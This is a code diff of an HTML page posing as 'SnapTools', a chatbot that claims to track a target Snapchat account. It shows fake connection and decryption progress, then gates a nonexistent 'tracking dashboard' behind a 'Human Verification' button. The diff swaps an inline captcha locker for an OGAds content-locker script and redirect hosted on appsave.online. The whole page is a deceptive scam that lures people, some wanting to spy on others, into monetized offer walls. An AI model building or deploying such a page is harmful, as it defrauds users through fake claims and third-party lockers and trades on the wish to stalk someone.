@@ -7,6 +7,9 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <!-- OGAds Locker Integration Script -->
+    <script type="text/javascript" id="ogjs" src="https://appsave.online/cl/js/grj95p"></script>
+    
     <style>
         :root {
             --snap-yellow: #FFFC00;
@@ -61,6 +64,7 @@
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
 
+        /* شريط التنبيهات الحي السفلي */
         .live-banner {
             background: #111113;
             border-bottom: 1px solid var(--border-color);
@@ -90,6 +94,7 @@
             100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
         }
 
+        /* الهيدر المطلوب: فقط الاسم وأيقونة Snapchat+ الأصلية */
         .chat-header {
             padding: 16px 20px;
             display: flex;
@@ -112,6 +117,7 @@
             letter-spacing: -0.5px;
         }
 
+        /* ستايل أيقونة Snapchat+ الرسمية (النجمة البيضاء داخل خلفية ملونة) */
         .snap-plus-badge {
             width: 24px;
             height: 24px;
@@ -125,6 +131,7 @@
             box-shadow: 0 2px 8px rgba(75, 97, 255, 0.4);
         }
 
+        /* أيقونة البوت داخل الشات (شعار سناب شات بالخلفية الصفراء) */
         .bot-avatar {
             width: 32px;
             height: 32px;
@@ -156,6 +163,7 @@
         }
         .theme-switcher-btn:hover { background: var(--bg-bubble-user); }
 
+        /* منطقة المحادثة */
         .chat-history {
             flex-grow: 1;
             overflow-y: auto;
@@ -192,11 +200,13 @@
             border: 1px solid var(--border-color);
         }
 
+        /* رسالة خطأ ستايل تيكست أحمر خفيف */
         .error-bubble {
             color: #ef4444;
             font-weight: 500;
         }
 
+        /* أنيميشن التنقيط */
         .typing-dots {
             display: inline-flex;
             gap: 5px;
@@ -214,6 +224,7 @@
         .typing-dots span:nth-child(2) { animation-delay: -0.16s; }
         @keyframes bounceDot { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
 
+        /* الأزرار الخيارات */
         .options-box {
             display: flex;
             flex-direction: column;
@@ -246,6 +257,7 @@
         .chat-opt-btn i.fa-chevron-right { font-size: 11px; color: var(--text-muted); }
         .chat-opt-btn i.btn-icon { color: var(--snap-yellow); font-size: 14px; width: 16px; text-align: center; }
 
+        /* الحاوية الخاصة بالصور للتحميل */
         .media-preview-container {
             border: 1px solid var(--border-color);
             background: var(--bg-bubble-user);
@@ -271,11 +283,13 @@
         .media-frame img { width: 100%; height: 100%; object-fit: cover; opacity: 0.25; filter: blur(5px); }
         .media-blur-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 6px; font-size: 11px; font-weight: 700; color: #ffffff; letter-spacing: 0.5px; }
 
+        /* شريط التحميل الإحترافي */
         .progress-block { margin-top: 14px; width: 100%; }
         .progress-labels { display: flex; justify-content: space-between; font-size: 11px; font-weight: 700; margin-bottom: 6px; }
         .progress-bar-bg { width: 100%; background: var(--bg-bubble-user); height: 6px; border-radius: 10px; overflow: hidden; border: 1px solid var(--border-color); }
         .progress-bar-fill { height: 100%; background: var(--text-main); width: 0%; transition: width 0.05s linear; }
 
+        /* كارت العرض النهائي */
         .offer-verification-card {
             border: 1px dashed var(--text-muted);
             background: rgba(24, 24, 27, 0.4);
@@ -291,16 +305,28 @@
         }
 
         .offer-verification-card h4 { font-size: 16px; font-weight: 800; letter-spacing: -0.3px; }
-        .offer-verification-card p { font-size: 12.5px; color: var(--text-muted); line-height: 1.6; margin-bottom: 10px; }
+        .offer-verification-card p { font-size: 12.5px; color: var(--text-muted); line-height: 1.6; }
 
-        /* ستايل مخصص باش الـ Captcha تجي متناسقة وسط الشات */
-        .captcha-holder-box {
+        .gpt-action-btn {
             width: 100%;
+            background: var(--snap-yellow);
+            color: var(--snap-black);
+            border: none;
+            padding: 14px;
+            border-radius: 30px;
+            font-size: 13.5px;
+            font-weight: 800;
+            cursor: pointer;
             display: flex;
+            align-items: center;
             justify-content: center;
-            min-height: 50px;
+            gap: 8px;
+            box-shadow: 0 10px 25px -5px rgba(255, 252, 0, 0.25);
+            transition: all 0.2s;
         }
+        .gpt-action-btn:hover { transform: translateY(-1px); box-shadow: 0 12px 28px -5px rgba(255, 252, 0, 0.35); }
 
+        /* صندوق الإدخال السفلي الاحترافي */
         .chat-input-area { padding: 20px 16px; background: var(--bg-chat); }
         .input-box-container {
             background: var(--bg-workspace);
@@ -329,26 +355,18 @@
 
         .footer-terms { text-align: center; font-size: 10.5px; color: var(--text-muted); margin-top: 12px; }
         .hidden-row { display: none !important; }
-
-        /* حاوية مخفية ف الأول باش الـ script يتعرف على الـ captcha بلا مشاكل */
-        #hiddenCaptchaPool {
-            display: none;
-        }
     </style>
 </head>
 <body>
 
-    <!-- هاد الـ div مخفي هنا غير باش الـ script يقراه ميريكانيكس ف الأول -->
-    <div id="hiddenCaptchaPool">
-        <div id="ogCaptchaWidget" data-captcha-enable="true"></div>
-    </div>
-
     <div class="chat-container">
+        <!-- شريط الإحصائيات والأشخاص الحيين الاحترافي -->
         <div class="live-banner">
             <span class="live-dot"></span>
             <span id="liveStatusText">Initializing secure pipeline network...</span>
         </div>
 
+        <!-- الهيدر: تم تغيير الإسم و إدخال لوقو سناب شات بلس الرسمي -->
         <div class="chat-header">
             <div class="ai-brand">
                 <span>SnapTools</span>
@@ -359,8 +377,10 @@
             </button>
         </div>
 
+        <!-- ساحة المحادثة التفاعلية -->
         <div class="chat-history" id="chatWindow">
             <div class="chat-row ai-row" id="welcomeMsg">
+                <!-- لوقو السناب شات الكلاسيكي الأصفر الملون للبوت داخل الشات -->
                 <div class="bot-avatar"><i class="fa-brands fa-snapchat"></i></div>
                 <div class="msg-bubble" id="welcomeText"></div>
             </div>
@@ -371,6 +391,7 @@
             </div>
         </div>
 
+        <!-- صندوق الكتابة السفلي -->
         <div class="chat-input-area">
             <div class="input-box-container">
                 <input type="text" class="gpt-input" id="userInputField" placeholder="Enter target Snapchat username..." autocomplete="off">
@@ -476,6 +497,7 @@
         function submitUserIdentifier() {
             const val = userInputField.value.trim();
             
+            // تحقق الحماية: إذا كان السطر خاوي تطلع الرسالة مباشرة وتوقف العملية
             if (val === '') {
                 appendErrorMessage("Error: Please enter the target Snapchat username first.");
                 return;
@@ -612,24 +634,26 @@
                                     <i class="fa-solid fa-user-shield" style="font-size: 26px; color: var(--snap-yellow);"></i>
                                     <h4>Human Verification Required</h4>
                                     <p>The network protocol achieved 100% stable connection. To avoid server scraping, please pass our short verification check below to immediately reveal the live decrypted tracking dashboard console.</p>
-                                    <div class="captcha-holder-box" id="captchaTargetZone"></div>
+                                    <button class="gpt-action-btn" onclick="openOgadsGate()">
+                                        <i class="fa-solid fa-key"></i> Pass Verification
+                                    </button>
                                 </div>
                             `;
                             document.getElementById(finalCardId).innerHTML = finalOfferHtml;
-                            
-                            // تحويل الـ Captcha من البلاصة المخفية لوسط الكارط ديريكت باش تبان للمستخدم بشكل نقي
-                            const widget = document.getElementById('ogCaptchaWidget');
-                            document.getElementById('captchaTargetZone').appendChild(widget);
-                            
                             chatWindow.scrollTop = chatWindow.scrollHeight;
                         }, 1000);
                     }, 400);
                 }
             }, 40);
         }
-    </script>
 
-    <!-- Script dial OGAds Captcha locker li f l-photo (m9add fl-lest dial body) -->
-    <script type="text/javascript" src="https://saveapp.store/cp/js/2wx2k"></script>
+        function openOgadsGate() {
+            if (typeof og_load === 'function') {
+                og_load(); 
+            } else {
+                window.location.href = "https://appsave.online/cl/i/grj95p";
+            }
+        }
+    </script>
 </body>
 </html>
